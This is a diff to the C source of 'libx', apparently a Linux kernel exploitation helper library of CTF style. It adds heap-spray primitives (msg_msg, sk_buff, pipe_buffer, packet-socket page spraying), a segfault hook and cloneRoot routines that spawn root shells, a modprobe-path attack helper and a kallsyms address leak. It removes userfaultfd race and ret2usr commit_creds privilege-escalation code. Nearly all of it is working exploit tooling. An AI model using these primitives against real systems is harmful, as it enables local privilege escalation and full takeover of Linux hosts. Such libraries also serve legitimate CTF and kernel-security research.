@@ -1,9 +1,15 @@
 #include "libx.h"
 
-#define MSGMNB_FILE "/proc/sys/kernel/msgmnb"
 /*
     Utils 
 */
+int optmem_max;
+
+int urand_fd=-1;
+int pg_vec_child[2],pg_vec_parent[2];
+int pg_vec_fds[INITIAL_PG_VEC_SPRAY];
+int sk_fd[0x20][2];
+int pipe_fd[PIPE_NUM*4][2];
 
 size_t fread_u64(const char *fname)
 {
@@ -30,6 +36,59 @@ size_t msgLimit(){
     }else{
         return MSGLIMIT;
     }
+}
+
+__u8 * dpn(__u8 * c,size_t n,size_t nn){
+    if(nn<n)
+        panic("Wrong usage of dpn");
+    
+    __u8* res = malloc(nn+1);
+    memset(res,0,nn);
+    memset(res,c,n);
+    res[n] = NULL;
+    return res;
+}
+
+__u8 * flatn(size_t *values,size_t n){
+    size_t * res = malloc(sizeof(size_t)*n+1);
+    for(int i = 0 ; i < n; i++){
+        res[i] = values[i];
+    }
+    return (__u8 *)res;
+}
+
+int findp64(__u8 *stack,size_t value, size_t n){
+    size_t * ptr;
+    if(n<8)
+        panic("[-] There is not enough space for searching");
+    for(size_t i =0 ; i <= n-8; i++){
+        ptr = stack+i;
+        if(value == *ptr)
+            return i;
+    }
+    return -1;
+}
+char *str(int a){
+    char *res = malloc(0x100);
+    sprintf(res, "%d", a);
+    return res;
+}
+
+char *strdupn(char *s, size_t size){
+    char * res = calloc(1,size);
+    strcpy(res,s);
+    return res;
+}
+
+void *mmapx(void *addr, size_t size)
+{
+	return mmap(addr, size, 7 , 0x21, -1, 0);
+}
+__u8 * dp(__u8 * c,size_t n){
+    __u8* res = calloc(1,n+1);
+    memset(res,c,n);
+    res[n] = NULL;
+    return res;
 }
 char * hex(size_t num){
     char *buf = malloc(0x20);
@@ -102,91 +161,6 @@ void modprobeAtk(char * path, char * cmd){
     system(buf);
 }
 
-/*
-Userfaultfd for race condition,
-Usage:
-    size_t *ptr = forze();
-*/
-void* userfaultfd_leak_handler(void* arg)
-{
-    struct uffd_msg msg;
-    unsigned long uffd = (unsigned long) arg;
-    struct pollfd pollfd;
-    int nready;
-    pollfd.fd = uffd;
-    pollfd.events = POLLIN;
-    
-    nready = poll(&pollfd, 1, -1);
-    sleep(100000);
-    if (nready != 1)
-    {
-        panic("Wrong poll return val");
-    }
-    nready = read(uffd, &msg, sizeof(msg));
-    if (nready <= 0)
-    {
-        panic("msg err");
-    }
-
-    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if (page == MAP_FAILED)
-    {
-        panic("[-] mmap err");
-    }
-    struct uffdio_copy uc;
-    // init page
-    memset(page, 0, sizeof(page));
-    uc.src = (unsigned long) page;
-    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
-    uc.len = PAGE_SIZE;
-    uc.mode = 0;
-    uc.copy = 0;
-    ioctl(uffd, UFFDIO_COPY, &uc);
-    return NULL;
-}
-void  RegisterUserfault(void *fault_page)
-{
-    void *handler = userfaultfd_leak_handler;
-    pthread_t thr;
-    struct uffdio_api ua;
-    struct uffdio_register ur;
-    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
-    ua.api = UFFD_API;
-    ua.features = 0;
-    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
-        panic("ioctl-UFFDIO_API");
-
-    ur.range.start = (unsigned long)fault_page; 
-    ur.range.len   = PAGE_SIZE;
-    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
-    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) 
-        panic("ioctl-UFFDIO_REGISTER");
-
-    int s = pthread_create(&thr, NULL,handler, (void*)uffd);
-
-    if (s!=0)
-        panic("pthread_create");
-}
-size_t * froze(){
-    size_t *ptr=mmap(0xdeadbeef000,0x1000,5,0x21,0,0);
-    if (ptr!=0xdeadbeef000)
-        panic("[x] Froze zone");
-    RegisterUserfault(ptr);
-    return ptr;
-}
-/*
-save_status for ret2user
-*/
-// void save_status()
-// {
-//     __asm__("mov user_cs, cs;"
-//             "mov user_ss, ss;"
-//             "mov user_sp, rsp;"
-//             "pushf;"
-//             "pop user_rflags;"
-//             );
-//     puts("[*] status has been saved.");
-// }
 
 
 
@@ -199,7 +173,7 @@ save_status for ret2user
     Desc:
         If kernel Heap is borken we can use to process a SEGFAULT and spawn a shell
 */
-void sigsegv_handler(int sig, siginfo_t *si, void *unused) {
+void _sigsegv_handler(int sig, siginfo_t *si, void *unused) {
     
     info("Libx: SegFault Handler is spwaning a shell...");
     shell();
@@ -210,12 +184,13 @@ void hook_segfault(){
     memset(&sa, 0, sizeof(sigaction));
     sigemptyset(&sa.sa_mask);
     sa.sa_flags = SA_SIGINFO;
-    sa.sa_sigaction = sigsegv_handler;
+    sa.sa_sigaction = _sigsegv_handler;
 
     if (sigaction(SIGSEGV, &sa, NULL) == -1) {
-        perror("sigaction");
+        perror("hook_segfault");
         exit(EXIT_FAILURE);
     }
+    // info("SegFault Hooked");
 }
 
 
@@ -245,10 +220,8 @@ void setsuid(char *filename){
         debug();
 */
 void debug(){
-    printf("\033[33m");
-    printf("[!] DEBUG");
-    printf("\033[0m\n");
-    char buf[0x10];
+    warn("DEBUG");
+    char buf[0x10]={};
     read(0,buf,0xf);
 }
 void hexdump(void * addr, size_t len){
@@ -266,52 +239,36 @@ void hexdump(void * addr, size_t len){
         p64(0xdeadbeef);
 */
 __u8 *p64(size_t val){
-    char *res  = malloc(0x18);
-    memset(res,0,0x18);
+    char *res  = calloc(1,0x18);
     size_t * p = res;
     * p = val;
     return res;
 }
 
 /*
-    Part II: MSGMSG related
-*/
-
-/*
-    Name: msgGet/msgQueue
-    Desc:
-        Provide a path, return the msgid
-    Example:
-        msgQueueCreate("/Home/user/1");
+    MSGMSG related
 */
 int msgGet(){
     int res= msgget(0,01644);
-    if(res<0)
-        panic("[-] Failed to create a msg queue");
+    if(res<0) panic("[-] Failed to create a msg queue");
     return res;
 }
 
 void msgSend(int msgid,size_t size,char *text){
-    msgMsg* msg = (msgMsg *)malloc(sizeof(long)+size+0x1);
+    msgMsg* msg = (msgMsg *)calloc(1,sizeof(long)+size+0x1);
     msg->mtype = 04000; // IPC_NOWAIT / Message type (can be any positive integer)
     memcpy(msg->mtext, text, size);
     // Send the message
     if (syscall(SYS_msgsnd, msgid, msg, size, 0)<0) {
         perror("msgsnd");
-        return ;
+        goto OUT;
     }
-    free(msg);
-    return ;  
+    OUT:
+        free(msg);
+        return ;  
 }
-/*
-    Name: msgRecv
-    Desc:
-        Remove (a) message(s) from msgqueue
-    Example:
-        msgRecv(msgid,0x1000,0);
-*/
 msgMsg* msgRecv(int msgid,size_t size){
-    msgMsg* recv = (msgMsg *)malloc(sizeof(long)+size+1);
+    msgMsg* recv = (msgMsg *)calloc(1,sizeof(long)+size+1);
     if (msgrcv(msgid, recv, size, 0, MSG_NOERROR | IPC_NOWAIT)<0) {
         perror("msgrcv");
         return NULL;
@@ -326,26 +283,11 @@ msgMsg* msgPeek(int msgid,size_t size){
     }
     return recv;
 }
-/*
-    Name: msgDel
-    Desc:
-        Delete a mesage queue
-    Example:
-        msgDel(msgid);
-*/
 void msgDel(int msgid){
     if (msgctl(msgid, IPC_RMID, NULL) == -1)
         perror("msgctl");
     return; 
 }
-
-/*
-    Name: msgSpray
-    Desc:
-        ;
-    Example:
-        ;
-*/
 msgSpray_t * _msgSpray(size_t size,size_t num,__u8* ctx){
     // Create one and reach the per queue limit
     size_t msg_id = msgGet();
@@ -378,10 +320,8 @@ msgSpray_t * msgSpray(size_t msg_len,size_t num, __u8 *ctx){
         ret = next;
         num -= this_round;
     }
-
     return ret;
 }
-
 void msgSprayClean(msgSpray_t *spray)
 {
 	while(spray) {
@@ -391,163 +331,22 @@ void msgSprayClean(msgSpray_t *spray)
 		spray = spray->next;
 	}
 }
-/*
-    Name: Dup one byte
-    Desc:
-        Duplicate a byte n times and return the allocated chunk
-    Example:
-        dp('\xff',0x88);
-*/
-__u8 * dp(__u8 * c,size_t n){
-    __u8* res = malloc(n+1);
-    memset(res,c,n);
-    res[n] = NULL;
-    return res;
-}
-
-/*
-    Name: Dup one byte
-    Desc:
-        Duplicate a byte n times and return the allocated chunk
-    Example:
-        dp('\xff',0x88);
-*/
-__u8 * dpn(__u8 * c,size_t n,size_t nn){
-    if(nn<n)
-        panic("Wrong usage of dpn");
-    
-    __u8* res = malloc(nn+1);
-    memset(res,0,nn);
-    memset(res,c,n);
-    res[n] = NULL;
-    return res;
-}
-
-/*
-    Name: flatn
-    Desc:
-        pack n size_t values by p64
-    Example:
-        sizez_t values = {1,2,3,4,5};
-        flat(values);
-*/
-__u8 * flatn(size_t *values,size_t n){
-    size_t * res = malloc(sizeof(size_t)*n+1);
-    for(int i = 0 ; i < n; i++){
-        res[i] = values[i];
-    }
-    return (__u8 *)res;
-}
-
-/*
-    Name: findp64
-    Desc:
-        find a specific pointer in a chunk of memory
-        and return the offset
-    Example:
-        int off = findp64(stack,0xdeadbeef,0x100)
-*/
-
-int findp64(__u8 *stack,size_t value, size_t n){
-    size_t * ptr;
-    if(n<8)
-        panic("[-] There is not enough space for searching");
-    for(size_t i =0 ; i <= n-8; i++){
-        ptr = stack+i;
-        if(value == *ptr)
-            return i;
-    }
-    return -1;
-}
-/*
-    Name: str
-    Desc:
-        transform a int to string
-    Example:
-        char *ptr = str(123);
-*/
-char *str(int a){
-    char *res = malloc(0x100);
-    sprintf(res, "%d", a);
-    return res;
-}
-/*
-    Name: strdupn
-    Desc:
-        load a string to heap
-    Example:
-        char *ptr = strdupn("n132",0x28);
-*/
-char *strdupn(char *s, size_t size){
-    char * res = calloc(1,size);
-    strcpy(res,s);
-    return res;
-}
-/*
-    Name: mmapx(addr,size)
-    Desc:
-        a wrapper of mmap
-    Example:
-        d
-*/
-
-void *mmapx(void *addr, size_t size)
-{
-	return mmap(addr, size, 7 , 0x21, -1, 0);
-}
-
-
-
-
-
-//  Part III: ret2usr
-
-
-/*
-    Name: getRootPrivilige
-    Desc:
-        getRootPrivilige for ret2usr.
-        Before hitting this chal, 
-        set commit_creds, prepare_kernel_cred, back2user
-
-    Example:
-        getRootPrivilige(msgid);
-*/
-size_t commit_creds = NULL;
-size_t prepare_kernel_cred = NULL;
-void (*back2user)()=NULL;
-
-void getRootPrivilige()
-{
-    if(prepare_kernel_cred==NULL || commit_creds == NULL)
-        panic("[-] prepare_kernel_cred or commit_creds is not set.");
-    
-    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
-    int (*commit_creds_ptr)(void *) = commit_creds;
-    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
-    if(back2user==NULL)
-        panic("[-] back2user is not set.");
-    info("[n132] Here we go!");
-    back2user();
-}
 
 
 /*
     sk_buff
-        -> initSocketArray
-        -> spraySkBuff
 */
 void initSocketArrayN(int sk_socket[SOCKET_NUM][2],size_t nr){
     for(int i = 0 ; i < nr ; i++)
         if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i])< 0)
             panic("Failed to create sockect pairs!\n");
-    info("Finish: initSocketArray");
+    // info("sk_buffer Inited");
 }
 void initSocketArray(int sk_socket[SOCKET_NUM][2]){
     for(int i = 0 ; i < SOCKET_NUM ; i++)
         if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i])< 0)
             panic("Failed to create sockect pairs!\n");
-    info("Finish: initSocketArray");
+    // info("sk_buffer Inited");
 }
 void spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size){
     // There is a 0x140 area after the buffer
@@ -568,20 +367,28 @@ void skbuffSend(int skt,__u8 * ctx, size_t size){
 void initPipeBuffer(int pipe_fd[PIPE_NUM][2]){
     for(int i  = 0 ; i < PIPE_NUM ; i++)
     {
-        if(!pipe(pipe_fd[i])){
+        if(pipe(pipe_fd[i])==-1){
+            perror("initPipeBuffer");
+            warn(hex(i));
+            warn(hex(pipe_fd[i]));
             panic("Failed to allocate pipe buffers");
-            panic(hex(i));
         }
         write(pipe_fd[i][1], "pipe_buffer init", 16);
     }
+    // success("pipe_buffer Inited");
 }
 void initPipeBufferN(int pipe_fd[PIPE_NUM][2],int num){
-
     for(int i  = 0 ; i < num ; i++)
     {
-        pipe(pipe_fd[i]);
+        if(pipe(pipe_fd[i])==-1){
+            perror("initPipeBuffer");
+            warn(hex(i));
+            warn(hex(pipe_fd[i]));
+            panic("Failed to allocate pipe buffers");
+        }
         write(pipe_fd[i][1], "pipe_buffer init", 16);
     }
+    // success("pipe_buffer Inited");
 }
 void pipeBufferResize(int fd,size_t count){
     // pipe_buffer init
@@ -595,6 +402,10 @@ void pipeBufferClose(int fd[2]){
     close(fd[0]);
     close(fd[1]);
 }
+
+/*
+    DEBUG 
+*/
 void leak_kallsyms(char *func){
     char * buf = calloc(1,0x101);
     strncpy(buf,"cat /proc/kallsyms | grep ' ",0x100);
@@ -682,7 +493,6 @@ size_t slab_get_partial(int size){
     // warn(hex(slab_get_oo(size)));
     return __KERNEL_DIV_ROUND_UP((nr_objs*2),slab_get_oo(size));
 }
-
 void dump_cpu_partial_slabs(){
     success("====cpu_partial_slabs====");
     char *buf = calloc(1,0x100);
@@ -695,12 +505,7 @@ void dump_cpu_partial_slabs(){
     success("====cpu_partial_slabs====");
 }
 
-/*
-    Page Allocation
-    Worked in Sandbox
-    
-*/
-// https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
+
 void sandbox()
 {   //unshare -r
     uid_t uid = getuid();
@@ -726,6 +531,8 @@ void sandbox()
 }
 
 /*
+    PG_VEC
+
     Usage:  
     ```
     spaInit();
@@ -733,24 +540,8 @@ void sandbox()
         spaCmd(ADD,i);
     ```
 */
-void pgvAdd(){
 
-}
-int sock_allocator_fd_child[2],sock_allocator_fd_parent[2];
-#define INITIAL_PAGE_SPRAY 1000
-int socketfds[INITIAL_PAGE_SPRAY];
-enum spray_cmd {
-    ADD,
-    FREE,
-    EXIT,
-};
-typedef struct
-{
-    enum spray_cmd cmd;
-    int32_t idx;
-    size_t order;
-    size_t nr;
-}ipc_req_t;
+
 int _pvg_sock(uint32_t size, uint32_t n)
 {
     struct tpacket_req req;
@@ -794,23 +585,23 @@ void _spray_comm_handler()
     int32_t result;
 
     do {
-        read(sock_allocator_fd_child[0], &req, sizeof(req));
-        assert(req.idx < INITIAL_PAGE_SPRAY);
+        read(pg_vec_child[0], &req, sizeof(req));
+        assert(req.idx < INITIAL_PG_VEC_SPRAY);
         if (req.cmd == ADD)
         {
-            socketfds[req.idx] = _pvg_sock(PAGE_SIZE * (1<<req.order), req.nr);
+            pg_vec_fds[req.idx] = _pvg_sock(PAGE_SIZE * (1<<req.order), req.nr);
         }
         else if (req.cmd == FREE)
         {
-            close(socketfds[req.idx]);
+            close(pg_vec_fds[req.idx]);
         }
         result = req.idx;
-        write(sock_allocator_fd_parent[1], &result, sizeof(result));
+        write(pg_vec_parent[1], &result, sizeof(result));
     } while(req.cmd != EXIT);
 
 }
 
-void pgvCmd(enum spray_cmd cmd, int idx, size_t order, size_t nr)
+void pgvCmd(enum PG_VEC_CMD cmd, int idx, size_t order, size_t nr)
 {
     ipc_req_t req;
     int32_t result;
@@ -819,15 +610,15 @@ void pgvCmd(enum spray_cmd cmd, int idx, size_t order, size_t nr)
     req.idx = idx;
     req.order = order;
     req.nr = nr;
-    write(sock_allocator_fd_child[1], &req, sizeof(req));
-    read(sock_allocator_fd_parent[0], &result, sizeof(result));
+    write(pg_vec_child[1], &req, sizeof(req));
+    read(pg_vec_parent[0], &result, sizeof(result));
     assert(result == idx);
 }
 
 // void spaInit(){
 void pgvInit(){
-    pipe(sock_allocator_fd_child);
-    pipe(sock_allocator_fd_parent);
+    pipe(pg_vec_child);
+    pipe(pg_vec_parent);
     if (!fork())
     {
         // unshare -r 
@@ -842,7 +633,6 @@ void pgvInit(){
     keeps checking if the cred is modified to root. If it's changed to root,
     it returns a root shell.
 */
-#define cloneRoot_FLAG CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND
 
 void _cloneRootShell(void){
     success("Root!");
@@ -881,25 +671,25 @@ void cloneRoot(void )
 {
     _cloneRoot(cloneRoot_FLAG,_cloneRootShell);
 }
-void implimit(){
-    int cpid = fork();
-    if(!cpid)
-    {
-        char buf[0x100]={};
-        int pid = getppid();
-        snprintf(buf,0x100,"prlimit -n65536 -p %d",pid);
-        info(buf);
-        system(buf);
-        exit(0);
+void impLimit(){
+    pid_t pid = getpid(); // Process ID
+    struct rlimit limit;
+
+    // Set soft limit and hard limit to 65536 for file descriptors
+    limit.rlim_cur = 65536;  // Soft limit
+    limit.rlim_max = 65536;  // Hard limit
+    // Use prlimit to set the resource limits of the process
+
+    if (prlimit(pid, RLIMIT_NOFILE, &limit, NULL) == -1) {
+        perror("prlimit");
+        exit(EXIT_FAILURE);
     }
-    int status;
-    waitpid(cpid, &status, 0);        
 }
 
 /*
     timerfd
 */
-int create_timer(int tv_sec)
+int createTimer(int tv_sec)
 {
     struct itimerspec new_value;
     memset(&new_value, 0, sizeof(new_value));
@@ -910,29 +700,58 @@ int create_timer(int tv_sec)
     return tfd;
 }
 
+int emptyTimer(int tv_sec)
+{
+    return timerfd_create(CLOCK_REALTIME, 0);
+}
+
 /*
-    key options
+    key 
+    options, not a good primitive for spray since 
+    the limit size for each account
 */
 
-int key_alloc(char *description, char *payload, int payload_len)
-{
+int keyAdd(char *description, char *payload, int payload_len){
     return syscall(__NR_add_key, "user", description, payload, payload_len,
                    KEY_SPEC_PROCESS_KEYRING);
 }
-int key_revoke(int keyid)
-{
+int keyDel(int keyid){
     return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
 }
-int key_update(int keyid, char *payload, size_t plen)
-{
+int keyEdit(int keyid, char *payload, size_t plen){
     return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
 }
-/*
-    Pin CPU
-*/
+// 
 void pinCPU(int id){
     cpu_set_t my_set;
     CPU_ZERO(&my_set);
     CPU_SET(id, &my_set);
-    sched_setaffinity(getpid(), sizeof(cpu_set_t), &my_set);
+    sched_setaffinity(0, sizeof(cpu_set_t), &my_set);
+}
+
+
+/*
+    Initial Function for Libx
+    The user may need init with libxInit
+*/
+void libxInit(){
+    pinCPU(0);
+    impLimit();
+    hook_segfault();
+    initPipeBuffer(pipe_fd);
+    initSocketArray(sk_fd);
+    success("Libx Inited");
+}
+static void __attribute__((constructor)) init(void){
+    setvbuf(stdin, NULL, _IONBF, 0);
+	setvbuf(stdout, NULL, _IONBF, 0);
+
+    urand_fd = open("/dev/urandom", 0);
+	if(unlikely(urand_fd < 0)) panic("Fail to open urandom");
+    size_t seed = 0;
+    read(urand_fd,&seed,sizeof(seed));
+    srand(seed);
+
+    optmem_max = fread_u64(OPTMEM_MAX_FILE);
+    // libxInit();
 }
